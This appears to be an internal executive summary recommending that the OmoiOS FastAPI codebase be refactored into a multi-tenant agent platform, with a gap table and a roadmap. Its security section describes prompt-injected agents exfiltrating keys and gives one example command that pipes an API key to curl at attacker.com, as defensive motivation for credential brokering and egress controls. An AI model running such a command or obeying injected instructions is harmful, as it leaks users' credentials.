# 01 · Executive Summary

## The Question

**Build vs. refactor:** should we write a new multi-tenant agent platform from scratch in TypeScript, or extract/refactor it out of the existing OmoiOS FastAPI codebase?

## The Recommendation

**Refactor OmoiOS.** Do not rewrite. Ship in 6–8 weeks, not 4–6 months.

The spec's own `17-omoi-os-adaptation.md` explicitly says: *"The risk isn't that you'll do too little; it's that you'll do too much. There's a version of this where you audit, decide to adopt 40% of the spec, and ship in six weeks. There's another version where you get excited about Better Auth or TypeScript or monorepo aesthetics and spend four months rewriting things that already work, for no customer-visible gain."*

## What OmoiOS Already Has (and maps to the spec)

| Spec Term | OmoiOS | Status |
|---|---|---|
| `Organization` (billing boundary) | `Organization` model with `max_concurrent_agents`, `max_agent_runtime_hours` | ✅ Match |
| `Workspace` (repo grouping) | `Project` model with GitHub repo binding | ✅ Match (rename) |
| `Session` (agent execution) | `Task` model with ~30 fields, state machine, retry logic | ✅ Match (rename) |
| Platform API key (`rpk_live_…`) | `APIKey` model with `sk_live_` prefix, SHA256 hash | ✅ Match (rename prefix) |
| User JWT | `auth_service.create_access_token` / refresh token | ✅ Match |
| RBAC | `Role`, `OrganizationMembership`, `authorization_service` with inheritance | ✅ Match |
| Sandbox abstraction | `SandboxProvider` Protocol + `DaytonaProvider`, `LocalDockerProvider` | ✅ Clean, ready for Modal adapter |
| Event streaming | WebSocket + Redis Pub/Sub (`api/routes/events.py`) | ✅ Works |
| User OAuth (GitHub) | Per-user tokens in `User.attributes` JSONB | ⚠️ Works but plaintext |
| Billing | Stripe integration, `stripe_service.py`, `subscription_service.py` | ✅ Working |

## What OmoiOS Is Missing (the real work)

| Gap | Severity | Effort |
|---|---|---|
| `Environment` resource (immutable sandbox recipe, versioned, with egress allowlist + credentials map) | **Critical** | 2–3 days |
| Session token (`sess_tok_…`) — short-lived, task-scoped API key | **Critical** | 1–2 days |
| Credential Broker (`/broker/creds/{provider}` with `bearer_secret` / `user_oauth` / `github_app` binding kinds) | **Critical** | 2–3 days |
| Hostname-level egress enforcement (HTTP proxy in-sandbox) | **High** | 3–5 days |
| Unified `Artifact` model (PR + file + log + screenshot) | **Medium** | 2 days |
| Standardized event envelope `{id, seq, type, actor, timestamp, data}` | **Medium** | 1 day |
| Generic HMAC-signed webhook dispatcher | **Medium** | 2 days |
| Multiplayer ACL (owner/editor/viewer on session) | **Medium** | 2 days |
| Modal provider (alongside Daytona) | **Medium** | 1 week |
| Public TypeScript + Python SDKs (generated from OpenAPI) | **Low** | 2–3 days |

**Total genuinely new work: ~5–6 weeks of focused engineering.**

## The Big Breakages (Security)

Three of the "missing" items above aren't nice-to-haves — they're active vulnerabilities the spec was designed to close:

### 1. Plaintext provider keys injected at sandbox boot
`UserCredential.api_key` stores Anthropic/OpenAI keys in plaintext (`backend/omoi_os/models/user_credentials.py`, comment explicitly flags "should be encrypted!"). They're then injected as `ANTHROPIC_API_KEY` env vars into the sandbox. A prompt-injected agent can `echo $ANTHROPIC_API_KEY | curl attacker.com`. The session-token → Broker pattern fixes this by minting fresh bearer tokens per-session that never live in long-term storage.

### 2. No hostname-based egress allowlist
There's no egress proxy in OmoiOS. Daytona's network controls are IP-level only, which doesn't work for `api.anthropic.com` (rotating CloudFront). An agent that's been prompt-injected can exfiltrate to any host. Spec §05 requires per-tenant `allowed_hosts[]` enforced at the proxy.

### 3. Trust boundary collapses inside the sandbox
There's currently no distinction between "user's server credential" (should survive all sessions) and "this session's credential" (should die with the session). Losing a session → losing the user's entire Anthropic budget until they rotate. Spec's `sess_tok_…` (1h sliding, one-session-scope) constrains blast radius to one session.

These aren't hypothetical. OmoiOS already executes user-authored prompts inside a sandbox that has real credentials. The Broker pattern is the standard remediation.

## Why Not TypeScript?

### Cost
- Replicating `services/auth_service.py`, `authorization_service.py`, `organization.py`, `stripe_service.py`, billing flows, 40+ routers, 60+ models, WebSocket/Redis event bus = 4+ months of work.
- Better Auth saves most of this *in a greenfield*. It doesn't save any of it *here* — you already paid that cost.

### Risk
- The TS Modal SDK is still beta. Per spec `15-modal-integration.md §1`: snapshot-restore, image builder chains (`apt_install().pip_install()`), Modal Dicts, and container lifecycle hooks are **not yet** in the TS SDK. The Python SDK has all of these. OmoiOS is Python — use the mature SDK.
- Ripping out working billing and auth to rebuild them = a regression surface customers would notice immediately.

### The one honest argument for TypeScript
The spec's client-side deliverables (Chrome extension, hosted editor iframe, public TS SDK) are TypeScript-native. **None of those require rewriting the backend.** Ship them alongside the FastAPI core.

## The Path Forward (8 PRs, 6–8 weeks)

1. **Audit** (1h) — Fill in §1 of `17-omoi-os-adaptation.md` against the actual codebase (already done in [`03-current-implementation.md`](./03-current-implementation.md)).
2. **Adapter interfaces** (1d) — Refactor current Daytona + agent-runtime code behind protocols. No behavior change.
3. **Session API alias** (1–2d) — Add `/v1/organizations/{org}/sessions/*` routes that delegate to existing task routes. Normalize event envelope at emit time.
4. **Session token + Credential Broker** (2–3d) — `/broker/creds/{provider}` endpoint, new API-key kind `session`, injection at sandbox boot.
5. **Environment resource** (2–3d) — Immutable, versioned, with `credentials: {…}` map and `egress.allowed_hosts: [...]`.
6. **Modal provider** (1w, parallel to prod) — Second `SandboxProvider` implementation. Feature-flag per tenant.
7. **Egress proxy** (3–5d) — Hostname allowlist enforced at HTTP proxy in-sandbox.
8. **Public SDK + client surfaces** (as priorities dictate) — TS + Python clients auto-generated from FastAPI OpenAPI.

See [`06-recommended-roadmap.md`](./06-recommended-roadmap.md) for the full breakdown, including what *not* to do (Better Auth migration, task→session DB rename, monorepo restructuring).

## One-Sentence Answer

OmoiOS is ~70% of the spec already — add the Environment resource, session-scoped credential broker, egress proxy, and a Modal adapter; don't rewrite in TypeScript.
